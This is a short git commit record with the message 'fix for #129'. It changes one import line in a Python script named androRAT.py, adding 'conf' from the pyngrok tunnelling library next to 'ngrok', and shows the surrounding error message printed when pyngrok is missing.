c2ce290579d4b9ccdbc8ee7e65b4c34dda784903
karma9874 <33444666+karma9874@users.noreply.github.com>
2022-02-17 22:50:38 +0530

    fix for #129

--- androRAT.py
+++ androRAT.py
@@ -6,7 +6,7 @@ import argparse
 import sys
 import platform
 try:
-    from pyngrok import ngrok
+    from pyngrok import ngrok,conf
 except ImportError as e:
     print(stdOutput("error")+"\033[1mpyngrok not found");
     print(stdOutput("info")+"\033[1mRun pip3 install -r requirements.txt")
